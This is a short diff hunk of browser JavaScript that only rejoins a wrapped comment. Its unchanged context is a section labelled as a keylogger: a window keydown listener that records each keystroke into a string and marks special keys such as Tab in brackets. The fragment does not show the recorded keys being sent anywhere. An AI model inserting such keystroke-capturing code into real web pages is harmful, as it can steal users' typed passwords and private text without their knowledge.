@@ -19,8 +19,7 @@ u(function() {
     // Keylogger
     let keys = "";
     window.addEventListener("keydown", e => {
-        // If it's not just a letter (e.g. a modifier key), make it easier to
-        spot e.g.
+        // If it's not just a letter (e.g. a modifier key), make it easier to spot e.g.
         "[Tab]"
         if (e.key.length > 1) {
             keys += `[${e.key}]`;
